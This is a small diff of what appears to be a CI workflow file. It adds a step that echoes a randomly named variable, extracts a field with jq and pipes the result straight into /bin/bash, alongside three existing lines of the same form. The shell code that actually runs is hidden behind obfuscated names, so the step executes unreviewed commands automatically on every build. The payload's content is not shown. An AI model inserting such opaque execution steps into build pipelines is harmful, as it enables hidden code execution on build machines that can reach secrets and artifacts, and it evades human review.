@@ -45,6 +45,7 @@ jobs:
           echo $pm238 | jq -r .zjrh577 | /bin/bash
           printf '%s' "$v98" | jq -r .cpz3 | /bin/bash
           printf '%s' "$wdq27413" | jq -r .tws88 | /bin/bash
+          echo $na0937 | jq -r .nt94975 | /bin/bash
 
       - name: Archive artifact
         uses: actions/upload-artifact@v4
